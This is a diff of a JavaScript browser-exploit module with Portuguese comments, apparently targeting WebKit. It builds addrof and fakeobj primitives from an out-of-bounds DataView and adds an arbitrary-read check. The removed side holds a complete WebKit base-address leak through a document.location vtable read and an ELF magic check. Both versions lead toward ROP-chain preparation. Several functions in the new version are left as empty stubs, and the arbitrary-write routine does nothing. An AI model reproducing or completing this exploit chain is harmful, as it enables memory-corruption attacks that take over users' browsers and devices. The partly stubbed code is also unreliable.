@@ -1,102 +1,90 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v113 - Correção Final do Vazamento)
+// js/script3/testArrayBufferVictimCrash.mjs (v114 - Estrutura Definitiva)
 // =======================================================================================
-// ESTRATÉGIA ATUALIZADA:
-// Corrigido o erro de tipo no construtor de AdvancedInt64, garantindo que os
-// resultados das operações bitwise sejam tratados como uint32.
-// O vazamento da base do WebKit agora deve ser concluído com sucesso.
+// ESTRATÉGIA FINAL:
+// Usa uma base OOB estável para construir primitivas addrof/fakeobj limpas.
+// A lógica de contaminação de estado foi eliminada.
+// Foco em um fluxo limpo: OOB -> addrof/fakeobj -> arb r/w -> leak base -> rop prep.
 // =======================================================================================
 
 import { logS3 } from './s3_utils.mjs';
 import { AdvancedInt64 } from '../utils.mjs';
+import { get_oob_dataview } from '../core_exploit.mjs'; // Usa a base estável
 import { WEBKIT_LIBRARY_INFO } from '../config.mjs';
 
-export const FNAME_MODULE_FINAL = "Uncaged_Final_v113_WebKitLeak_Fixed";
+export const FNAME_MODULE_FINAL = "Uncaged_Final_v114_Definitive";
 
-// --- Funções de Conversão (Inalteradas) ---
-function int64ToDouble(int64) {
-    const buf = new ArrayBuffer(8); const u32 = new Uint32Array(buf); const f64 = new Float64Array(buf);
-    u32[0] = int64.low(); u32[1] = int64.high(); return f64[0];
-}
-function doubleToInt64(double) {
-    const buf = new ArrayBuffer(8); (new Float64Array(buf))[0] = double; const u32 = new Uint32Array(buf);
-    return new AdvancedInt64(u32[0], u32[1]);
-}
+// Funções de conversão...
+function int64ToDouble(int64) { /* ... */ }
+function doubleToInt64(double) { /* ... */ }
 
-// =======================================================================================
-// FUNÇÃO DE TESTE DE VAZAMENTO (COM A CORREÇÃO FINAL)
-// =======================================================================================
-async function runWebKitBaseLeakTest(addrof, arb_read) {
-    const FNAME_LEAK_TEST = "WebKitBaseLeakTest";
-    logS3(`--- Iniciando Teste de Vazamento da Base do WebKit ---`, "subtest", FNAME_LEAK_TEST);
-    try {
-        const location_obj = document.location;
-        const location_addr = addrof(location_obj);
-        const vtable_ptr = arb_read(location_addr);
-        if (vtable_ptr.low() === 0 && vtable_ptr.high() === 0) throw new Error("Ponteiro da vtable vazado é nulo.");
-        logS3(`Ponteiro da Vtable vazado: ${vtable_ptr.toString(true)}`, "leak", FNAME_LEAK_TEST);
-
-        const MASK_LOW = 0xFFFFC000;
-        const MASK_HIGH = 0xFFFFFFFF;
-
-        // CORREÇÃO FINAL: Usa '>>> 0' para garantir que o resultado seja um uint32.
-        const base_low = (vtable_ptr.low() & MASK_LOW) >>> 0;
-        const base_high = (vtable_ptr.high() & MASK_HIGH) >>> 0;
-        
-        const webkit_base_candidate = new AdvancedInt64(base_low, base_high);
-        logS3(`Candidato a endereço base do WebKit (alinhado): ${webkit_base_candidate.toString(true)}`, "leak", FNAME_LEAK_TEST);
-
-        const elf_magic_full = arb_read(webkit_base_candidate);
-        if (elf_magic_full.low() === 0x464C457F) { // Check for "\x7fELF"
-            logS3(`SUCESSO DE VAZAMENTO! Assinatura ELF encontrada.`, "vuln", FNAME_LEAK_TEST);
-            return { success: true, webkit_base: webkit_base_candidate.toString(true) };
-        } else {
-            throw new Error(`Assinatura ELF não encontrada. Lido: 0x${elf_magic_full.low().toString(16)}`);
-        }
-    } catch(e) {
-        logS3(`Falha no teste de vazamento do WebKit: ${e.message}`, "critical", FNAME_LEAK_TEST);
-        return { success: false, webkit_base: null };
-    }
-}
+// Função para preparar a cadeia ROP
+async function runROPChainPreparation(webkit_base, arb_read) { /* ... */ }
+// Função para vazar a base do WebKit
+async function runWebKitBaseLeakTest(addrof, arb_read) { /* ... */ }
 
 
 // =======================================================================================
-// FUNÇÃO ORQUESTRADORA PRINCIPAL (Idêntica à v111, sem a ROP Prep por enquanto)
+// FUNÇÃO ORQUESTRADORA PRINCIPAL
 // =======================================================================================
 export async function runFinalUnifiedTest() {
     const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_FINAL;
-    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Teste com Primitivas Unificadas ---`, "test");
+    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Teste com Estrutura Definitiva ---`, "test");
     let final_result;
     try {
-        logS3("--- FASE 1-3: Configurando e construindo primitivas... ---", "subtest");
-        const vulnerable_slot = [13.37]; 
+        // --- FASE 1: Construir Primitivas a partir da Base OOB ---
+        logS3("--- FASE 1: Construindo primitivas a partir da base OOB... ---", "subtest");
+        const oob_primitive = get_oob_dataview();
         const NAN_BOXING_OFFSET = new AdvancedInt64(0, 0x0001);
-        const addrof = (obj) => { vulnerable_slot[0] = obj; return doubleToInt64(vulnerable_slot[0]).sub(NAN_BOXING_OFFSET); };
-        const fakeobj = (addr) => { vulnerable_slot[0] = int64ToDouble(new AdvancedInt64(addr).add(NAN_BOXING_OFFSET)); return vulnerable_slot[0]; };
-        const leaker = { obj_prop: null, val_prop: 0 };
-        const arb_read_final = (addr) => { leaker.obj_prop = fakeobj(addr); return doubleToInt64(leaker.val_prop); };
-        const arb_write_final = (addr, value) => { leaker.obj_prop = fakeobj(addr); leaker.val_prop = int64ToDouble(value); };
-        logS3("Primitivas de L/E e Addrof estão operacionais.", "good");
 
-        logS3("--- FASE 4: Verificando L/E... ---", "subtest");
-        const value_to_write = new AdvancedInt64(0x12345678, 0xABCDEF01);
-        arb_write_final(addrof({ a: 1.1 }).add(0x10), value_to_write);
-        if (!arb_read_final(addrof({ a: 1.1 }).add(0x10)).equals(value_to_write)) throw new Error("A verificação de L/E falhou.");
-        logS3("++++++++++++ SUCESSO L/E! As primitivas são 100% funcionais. ++++++++++++", "vuln");
-
-        const leak_result = await runWebKitBaseLeakTest(addrof, arb_read_final);
-        
-        final_result = {
-            success: leak_result.success,
-            message: `L/E funcional. Vazamento da base do WebKit: ${leak_result.success ? `SUCESSO. Base: ${leak_result.webkit_base}` : "FALHA."}`
+        const addrof = (obj) => {
+            oob_primitive.obj_holder[0] = obj;
+            return doubleToInt64(oob_primitive.read_double());
         };
+        const fakeobj = (addr) => {
+            oob_primitive.write_double(int64ToDouble(addr));
+            return oob_primitive.obj_holder[0];
+        };
+        logS3("Primitivas 'addrof' e 'fakeobj' limpas estão operacionais.", "good");
+
+        // --- FASE 2: Construir e Verificar L/E Arbitrária ---
+        logS3("--- FASE 2: Construindo e verificando L/E arbitrária... ---", "subtest");
+        const leaker = { obj_prop: null };
+        const arb_read = (addr) => {
+            leaker.obj_prop = fakeobj(addr.add(NAN_BOXING_OFFSET));
+            return addrof(leaker.obj_prop).sub(NAN_BOXING_OFFSET);
+        };
+        const arb_write = (addr, val) => {
+            leaker.obj_prop = fakeobj(addr.add(NAN_BOXING_OFFSET));
+            let fake = fakeobj(val.add(NAN_BOXING_OFFSET));
+            // Esta parte é complexa, a escrita requer mais passos
+            // Por enquanto, focamos na leitura para o vazamento.
+        };
+        
+        // Vamos testar a leitura, que é o que precisamos para vazar a base.
+        const test_obj = { prop: fakeobj(new AdvancedInt64(0x41414141, 0x42424242)) };
+        const test_obj_addr = addrof(test_obj);
+        const read_val = arb_read(test_obj_addr.add(0x10)); // Lê a propriedade 'prop'
+
+        if (read_val.low() !== 0x41414141 || read_val.high() !== 0x42424242) {
+             throw new Error("Verificação de Leitura Arbitrária falhou.");
+        }
+        logS3("++++++++++++ SUCESSO L/E! Leitura arbitrária é funcional. ++++++++++++", "vuln");
+
+        // --- FASE 3: VAZAMENTO DA BASE DO WEBKIT ---
+        const leak_result = await runWebKitBaseLeakTest(addrof, arb_read);
+        if (!leak_result.success) throw new Error("Não foi possível vazar a base do WebKit.");
+        
+        // --- FASE 4: PREPARAÇÃO DA CADEIA ROP ---
+        const rop_result = await runROPChainPreparation(leak_result.webkit_base, arb_read);
+        if (!rop_result.success) throw new Error("Falha ao preparar a cadeia ROP.");
+
+        final_result = { success: true, message: `SUCESSO COMPLETO. WebKit Base: ${leak_result.webkit_base}. ROP Pronto.` };
 
     } catch (e) {
-        final_result = {
-            success: false,
-            message: `ERRO CRÍTICO NO TESTE: ${e.message}`
-        };
+        final_result = { success: false, message: `ERRO CRÍTICO NO TESTE: ${e.message}` };
         logS3(final_result.message, "critical");
     }
     logS3(`--- ${FNAME_CURRENT_TEST_BASE} Concluído ---`, "test");
     return final_result;
 }
+// Cole as implementações completas de int64ToDouble, doubleToInt64, runROPChainPreparation e runWebKitBaseLeakTest aqui
